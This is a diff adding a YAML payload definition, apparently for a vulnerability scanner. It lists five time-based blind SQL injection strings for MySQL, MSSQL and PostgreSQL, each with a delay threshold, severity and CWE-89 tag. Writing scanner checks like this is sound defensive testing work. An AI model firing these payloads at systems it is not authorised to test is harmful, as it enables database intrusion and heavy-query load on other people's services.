@@ -1,0 +1,40 @@
+id: sqli-time
+name: SQL injection — time-based blind
+context:
+  any: true
+
+payloads:
+  - value: "' AND SLEEP(3)--"
+    detect: { time_based_ms: 2500 }
+    id: sqli-time-mysql
+    title: "SQL injection — time-based blind (MySQL SLEEP)"
+    severity: critical
+    cwe: CWE-89
+
+  - value: "'; WAITFOR DELAY '0:0:3'--"
+    detect: { time_based_ms: 2500 }
+    id: sqli-time-mssql
+    title: "SQL injection — time-based blind (MSSQL WAITFOR)"
+    severity: critical
+    cwe: CWE-89
+
+  - value: "1;SELECT pg_sleep(3)--"
+    detect: { time_based_ms: 2500 }
+    id: sqli-time-pg
+    title: "SQL injection — time-based blind (PostgreSQL pg_sleep)"
+    severity: critical
+    cwe: CWE-89
+
+  - value: "1' AND (SELECT * FROM (SELECT SLEEP(3))a)--"
+    detect: { time_based_ms: 2500 }
+    id: sqli-time-mysql-sub
+    title: "SQL injection — time-based blind (MySQL subquery)"
+    severity: critical
+    cwe: CWE-89
+
+  - value: "1 OR (SELECT COUNT(*) FROM generate_series(1,3000000))>0--"
+    detect: { time_based_ms: 2500 }
+    id: sqli-time-pg-heavy
+    title: "SQL injection — time-based blind (PostgreSQL heavy query)"
+    severity: critical
+    cwe: CWE-89
